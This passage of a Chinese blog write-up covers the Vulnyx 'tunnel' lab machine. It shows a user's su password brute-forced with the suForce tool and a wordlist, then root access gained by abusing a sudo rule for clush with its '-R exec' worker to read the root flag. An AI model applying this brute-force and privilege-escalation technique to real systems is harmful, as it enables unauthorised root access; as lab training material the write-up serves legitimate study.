+<pre class="language-bash" data-language="bash"><code class="language-bash">m.davis@tunnel:~$ ./suForce <span class="token parameter variable">-u</span> j.harris <span class="token parameter variable">-w</span> pass.txt
+            _____                          
+ ___ _   _ <span class="token operator">|</span>  ___<span class="token operator">|</span>__  _ __ ___ ___   
+/ __<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">||</span> <span class="token operator">|</span>_ / _ <span class="token punctuation">\</span><span class="token operator">|</span> '__/ __/ _ <span class="token punctuation">\</span> 
+<span class="token punctuation">\</span>__ <span class="token punctuation">\</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">||</span>  _<span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span>  __/  
+<span class="token operator">|</span>___/<span class="token punctuation">\</span>__,_<span class="token operator">||</span>_<span class="token operator">|</span>  <span class="token punctuation">\</span>___/<span class="token operator">|</span>_<span class="token operator">|</span>  <span class="token punctuation">\</span>___<span class="token punctuation">\</span>___<span class="token operator">|</span>  
+───────────────────────────────────
+ code: d4t4s3c     version: v1.0.0
+───────────────────────────────────
+🎯 Username <span class="token operator">|</span> j.harris
+📖 Wordlist <span class="token operator">|</span> pass.txt
+🔎 Status   <span class="token operator">|</span> <span class="token number">61</span>/301324/0%/harrison
+💥 Password <span class="token operator">|</span> harrison</code></pre>
+<p>爆破得密码harrison</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">j.harris@tunnel:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
+<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> contraseña para j.harris: 
+Matching Defaults entries <span class="token keyword">for</span> j.harris on tunnel:
+    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin, use_pty
+
+User j.harris may run the following commands on tunnel:
+    <span class="token punctuation">(</span>root<span class="token punctuation">)</span> /usr/bin/clush</code></pre>
+<p>可以root执行clush指令</p>
+<h2 id="clush提权"><a href="#clush提权" class="headerlink" title="clush提权"></a>clush提权</h2><pre class="language-none"><code class="language-none">clush 是一个用于并行执行命令的工具，通常用于集群管理。它是 Cluster Shell 工具的一部分，允许你在多个主机上同时执行命令，类似于 ssh 但支持并行操作，常用于大规模分布式系统或集群的管理</code></pre>
+<p>-h查看参数可以注意到一个-R </p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-R</span> WORKER, <span class="token parameter variable">--worker</span><span class="token operator">=</span>WORKER
+                    worker name to use <span class="token keyword">for</span> <span class="token builtin class-name">command</span> execution <span class="token punctuation">(</span><span class="token string">'exec'</span>,
+                    <span class="token string">'rsh'</span>, <span class="token string">'ssh'</span>, etc. default is <span class="token string">'ssh'</span><span class="token punctuation">)</span></code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">j.harris@tunnel:~$ <span class="token function">sudo</span> clush <span class="token parameter variable">-w</span> <span class="token number">123</span>  <span class="token parameter variable">-R</span> <span class="token builtin class-name">exec</span> <span class="token string">"id"</span>
+<span class="token number">123</span>: <span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">grupos</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>
+<p>指定R为exec可以执行命令</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">j.harris@tunnel:~$ <span class="token function">sudo</span> clush <span class="token parameter variable">-w</span> <span class="token number">123</span>  <span class="token parameter variable">-R</span> <span class="token builtin class-name">exec</span> <span class="token string">"cat /root/root.txt"</span>
+<span class="token number">123</span>: 213f91a2b6d615f201411f7dc9d94ecf</code></pre>
+<p>拿到rootflag，后续也可以轻松拿到shell，不做展示。</p>
+</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>ta0</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://tao0845.github.io/posts/66723be2/" title="Vulnyx-tunnel">https://tao0845.github.io/posts/66723be2/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/273d8e90/" rel="next" title="thehackerslabs-elcandidato"><span class="post-nav-text">thehackerslabs-elcandidato</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2024 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> ta0</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.1.1</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="总访客量"><span><span class="icon iconify" data-icon="ri:user-line"></span></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><span class="icon iconify" data-icon="ri:eye-line"></span></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+  // Handle and trigger popup window
+  document.querySelector(".popup-trigger").addEventListener("click", () => {
+    document.querySelector(".popup").classList.add("show");
+    setTimeout(() => {
+      document.querySelector(".search-input").focus();
+    }, 100);
+  });
+
+  // Monitor main search box
+  const onPopupClose = () => {
+    document.querySelector(".popup").classList.remove("show");
+  };
+
+  document.querySelector(".popup-btn-close").addEventListener("click", () => {
+    onPopupClose();
+  });
+
+  window.addEventListener("keyup", event => {
+    if (event.key === "Escape") {
+      onPopupClose();
+    }
+  });
+});
+</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
+mediumZoom(images)</script><style>.medium-zoom-image {
+  z-index: 99;
+}</style></body></html>
